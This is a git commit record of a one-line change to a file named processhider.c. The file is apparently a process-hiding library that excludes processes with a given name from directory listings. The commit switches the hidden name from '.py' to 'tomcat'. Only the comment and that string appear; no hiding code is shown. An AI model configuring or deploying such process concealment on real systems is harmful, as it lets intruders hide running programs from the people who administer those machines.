20139254c768592bcf0a3e209c794778218cabad
bangbedh <105153362+bangbedh@users.noreply.github.com>
2022-05-30 02:41:34 +0700

    Update processhider.c

--- processhider.c
+++ processhider.c
@@ -9,7 +9,7 @@
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = ".py";
+static const char* process_to_filter = "tomcat";
 
 /*
  * Get a directory name given a DIR* handle
